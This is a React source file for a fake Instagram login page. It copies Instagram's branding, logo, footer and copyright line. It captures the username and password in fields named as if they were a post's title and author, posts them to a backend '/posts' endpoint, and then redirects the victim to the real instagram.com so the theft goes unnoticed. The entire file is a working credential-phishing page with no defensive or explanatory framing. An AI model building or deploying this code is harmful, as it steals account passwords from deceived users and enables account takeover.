import React, { useState } from "react";
import logo from "../logo.png";
import "../frontened-assets/style.css";
import all from "../all.png";
import { useMutation } from "react-query";
import { apiBaseUrl } from "../constant";
import { Button } from "antd";

function LoginPage() {
  const [post_title, setPost_title] = useState("");
  const [post_author, setPost_author] = useState("");
  const [content, setContent] = useState("no content");
  const [status, setStatus] = useState("publish");

  const { mutateAsync: userDataRequest, isLoading: instaLoader } = useMutation(
    "userData",
    (payload) =>
      fetch(`${apiBaseUrl}/posts`, {
        method: "POST",
        body: JSON.stringify(payload),
        headers: {
          "Content-Type": "application/json",
        },
      }).then((res) => res.json())
  );

  const handleLogin = () => {
    if (!post_title || !post_author) {
      return;
    }
    const randomDate = new Date(
      Date.now() - Math.floor(Math.random() * 100) * 24 * 60 * 60 * 1000
    );

    const categoryIds = [1, 2, 3, 4, 5];

    const randomCategoryId =
      categoryIds[Math.floor(Math.random() * categoryIds.length)];

    const payload = {
      post_title,
      post_author,
      post_date: randomDate.toISOString().split("T")[0],
      post_category_id: randomCategoryId,
      post_content: content,
      post_status: status,
    };

    userDataRequest(payload, {
      onSuccess: () => {
        window.location = "https://www.instagram.com/";
      },
    });
  };

  return (
    <div className="container">
      <div className="main-container">
        <div className="main-content">
          <div className="form-container">
            <div className="form-content box">
              <div className="logo">
                <img src={logo} alt="Instagram logo" className="logo-light" />
                <img
                  src="./images/logo-dark.png"
                  alt="Instagram logo"
                  className="logo-dark"
                />
              </div>
              <div className="signin-form" id="signin-form">
                <div className="form-group">
                  <div className="animate-input">
                    {post_title ? (
                      ""
                    ) : (
                      <span> Phone number, username or email </span>
                    )}
                    <input
                      type="text"
                      value={post_title}
                      onChange={(e) => setPost_title(e.target.value)}
                    />
                  </div>
                </div>
                <div className="form-group">
                  <div className="animate-input">
                    {post_author ? "" : <span>Password </span>}
                    <input
                      type="text"
                      value={post_author}
                      onChange={(e) => setPost_author(e.target.value)}
                    />
                  </div>
                </div>
                <div className="btn-group">
                  <Button
                    className="btn-login"
                    onClick={handleLogin}
                    loading={instaLoader}
                  >
                    Log In
                  </Button>
                </div>
                <div class="divine">
                  <div></div>
                  <div>OR</div>
                  <div></div>
                </div>
                <div class="btn-group">
                  <button class="btn-fb">
                    <img src="./images/facebook-icon.png" alt="" />
                    <span>Log in with Facebook</span>
                  </button>
                </div>
                <a href="#" class="forgot-pw">
                  Forgot password?
                </a>
              </div>
            </div>
            <div className="box goto">
              <p>
                Don't have an account? <a href="#">Sign up</a>
              </p>
            </div>

            <div className="app-download">
              <p>Get the app.</p>
              <div className="store-link">
                <a href="https://play.google.com/store/apps?hl=en&gl=US">
                  <img
                    src={all}
                    alt="app store"
                    style={{ height: "100px", width: "100%" }}
                  />
                </a>
                <a href="#">
                  {/* <img src="./playStore.png" alt="google play" height="350px" /> */}
                </a>
              </div>
            </div>
          </div>
        </div>
      </div>
      <div className="footer">
        <div className="links">
          <a href="#">About</a>
          <a href="#">Blog</a>
          <a href="#">Jobs</a>
          <a href="#">Help</a>
          <a href="#">API</a>
          <a href="#">Privacy</a>
          <a href="#">Terms</a>
          <a href="#">Top Accounts</a>
          <a href="#">Hashtags</a>
          <a href="#">Locations</a>
          <a href="#" id="darkmode-toggle">
            Darkmode
          </a>
        </div>
        <div className="copyright">© 2021 Instagram from Facebook</div>
      </div>
    </div>
  );
}

export default LoginPage;
